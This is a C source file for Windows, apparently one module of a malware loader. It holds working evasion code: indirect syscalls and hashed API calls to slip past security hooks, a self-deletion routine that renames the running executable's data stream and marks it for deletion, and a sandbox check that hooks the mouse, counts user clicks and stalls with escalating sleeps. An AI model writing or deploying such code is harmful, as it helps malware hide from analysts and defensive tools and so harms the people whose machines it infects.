#include <Windows.h>
#include <stdio.h>
#include "Common.h"
#include "Debug.h"

// Global hook handle variable
HHOOK g_hMouseHook = NULL;

// Global mouse clicks counter
DWORD g_dwMouseClicks = NULL;

extern VX_TABLE g_Sys;
extern API_HASHING g_Api;

// The callback function that will be executed whenever the user clicked a mouse button
LRESULT CALLBACK HookEvent(INT nCode, WPARAM wParam, LPARAM lParam) {

	if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
#ifdef DEBUG
		PRINTA("[+] Mouse Click Recorded \n");
#endif
		g_dwMouseClicks++;
	}

	return g_Api.pCallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

BOOL MouseClicksLogger() {

	MSG 	Msg = { 0 };

	// Installing hook
	g_hMouseHook = g_Api.pSetWindowsHookExW(
		WH_MOUSE_LL,
		(HOOKPROC)HookEvent,
		NULL,
		NULL
	);
	if (!g_hMouseHook) {
#ifdef DEBUG
		PRINTA("[!] SetWindowsHookExW Failed With Error : %d \n", GetLastError());
#endif
	}

	// Process unhandled events
	while (g_Api.pGetMessageW(&Msg, NULL, NULL, NULL)) {
		g_Api.pDefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
	}

	return TRUE;
}

BOOL DeleteSelf() {

	WCHAR				    szPath[MAX_PATH * 2] = { 0 };
	FILE_DISPOSITION_INFO	Delete = { 0 };
	HANDLE				    hFile = INVALID_HANDLE_VALUE;
	PFILE_RENAME_INFO		pRename = NULL;
	CONST PWCHAR NewStream = (CONST PWCHAR)NEW_STREAM;
	SIZE_T				    sRename = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);

	// Allocating enough buffer for the 'FILE_RENAME_INFO' structure
	pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
	if (!pRename) {
#ifdef DEBUG
		PRINTA("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}

	// Cleaning up the structures
	ZeroMemory(szPath, sizeof(szPath));
	ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));

	//--------------------------------------------------------------------------------------------------------------------------
	// Marking the file for deletion (used in the 2nd SetFileInformationByHandle call)
	Delete.DeleteFile = TRUE;

	// Setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
	pRename->FileNameLength = sizeof(NewStream);
	RtlCopyMemory(pRename->FileName, NewStream, sizeof(NewStream));

	//--------------------------------------------------------------------------------------------------------------------------
	// Used to get the current file name
	if (g_Api.pGetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
#ifdef DEBUG
		PRINTA("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}

	//--------------------------------------------------------------------------------------------------------------------------
	// RENAMING
	// Opening a handle to the current file
	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
		PRINTA("[!] CreateFileW [R] Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTW(L"[i] Renaming :$DATA to %s  ...", NEW_STREAM);
#endif

	// Renaming the data stream
	if (!g_Api.pSetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
#ifdef DEBUG
		PRINTA("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTW(L"[+] DONE \n");
#endif

	ConfS(g_Sys.NtClose.wSysC);
	RunSys(hFile);

	//--------------------------------------------------------------------------------------------------------------------------
	// DELETING
	// Opening a new handle to the current file
	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE && GetLastError() == ERROR_FILE_NOT_FOUND) {
		// in case the file is already deleted
		return TRUE;
	}
	if (hFile == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
		PRINTA("[!] CreateFileW [D] Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}

#ifdef DEBUG
	PRINTW(L"[i] DELETING ...");
#endif

	// Marking for deletion after the file's handle is closed
	if (!g_Api.pSetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
#ifdef DEBUG
		PRINTA("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTW(L"[+] DONE \n");
#endif

	ConfS(g_Sys.NtClose.wSysC);
	RunSys(hFile);

	//--------------------------------------------------------------------------------------------------------------------------
	// Freeing the allocated buffer
	HeapFree(GetProcessHeap(), 0, pRename);

	return TRUE;
}


BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {

	// Converting minutes to milliseconds
	DWORD                   dwMilliSeconds = ftMinutes * 60000;
	LARGE_INTEGER           DelayInterval = { 0 };
	LONGLONG                Delay = NULL;
	NTSTATUS                STATUS = NULL;
	DWORD                   _T0 = NULL,
		_T1 = NULL;

	// Converting from milliseconds to the 100-nanosecond - negative time interval
	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;

	_T0 = g_Api.pGetTickCount64();

	// Sleeping for 'dwMilliSeconds' ms
	ConfS(g_Sys.NtDelayExecution.wSysC);
	if ((STATUS = RunSys(FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {
#ifdef DEBUG
		PRINTA("[!] NtDelayExecution Failed With Error : 0x%0.8X \n", STATUS);
#endif
		return FALSE;
	}

	_T1 = g_Api.pGetTickCount64();

	// Slept for at least 'dwMilliSeconds' ms, then 'DelayExecutionVia_NtDE' succeeded, otherwize it failed
	if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
		return FALSE;

#ifdef DEBUG
	PRINTA("\n\t>> _T1 - _T0 = %d \n", (DWORD)(_T1 - _T0));

	PRINTA("[+] DONE \n");
#endif

	return TRUE;
}

BOOL AntiAnalysis(DWORD dwMilliSeconds) {

	HANDLE					hThread = NULL;
	NTSTATUS				STATUS = NULL;
	LARGE_INTEGER			DelayInterval = { 0 };
	FLOAT					i = 1;
	LONGLONG				Delay = NULL;

	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;

	// Try 10 times, after that return FALSE
	while (i <= 10) {

#ifdef DEBUG
		PRINTA("[#] Monitoring Mouse-Clicks For %d Seconds - Need 6 Clicks To Pass\n", (dwMilliSeconds / 1000));
#endif

		// Creating a thread that runs 'MouseClicksLogger' function
		ConfS(g_Sys.NtCreateThreadEx.wSysC);
		if ((STATUS = RunSys(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, MouseClicksLogger, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
#ifdef DEBUG
			PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
#endif
			return FALSE;
		}

		// Waiting for the thread for 'dwMilliSeconds'
		ConfS(g_Sys.NtWaitForSingleObject.wSysC);
		if ((STATUS = RunSys(hThread, FALSE, &DelayInterval)) != 0 && STATUS != STATUS_TIMEOUT) {
#ifdef DEBUG
			PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", STATUS);
#endif
			return FALSE;
		}

		ConfS(g_Sys.NtClose.wSysC);
		if ((STATUS = RunSys(hThread)) != 0) {
#ifdef DEBUG
			PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
#endif
			return FALSE;
		}

		// Unhooking
		if (g_hMouseHook && !g_Api.pUnhookWindowsHookEx(g_hMouseHook)) {
#ifdef DEBUG
			PRINTA("[!] UnhookWindowsHookEx Failed With Error : %d \n", GetLastError());
#endif
			return FALSE;
		}

		// Delaying execution for specific amount of time
		if (!DelayExecutionVia_NtDE((FLOAT)(i / 2)))
			return FALSE;

		// If the user clicked more than 5 times, we return true
		if (g_dwMouseClicks > 5)
			return TRUE;

		// If not, we reset the mouse-clicks variable, and monitor the mouse-clicks again
		g_dwMouseClicks = NULL;

		// Increment 'i', so that next time 'DelayExecutionVia_NtDE' will wait longer
		i++;
	}

	return FALSE;
}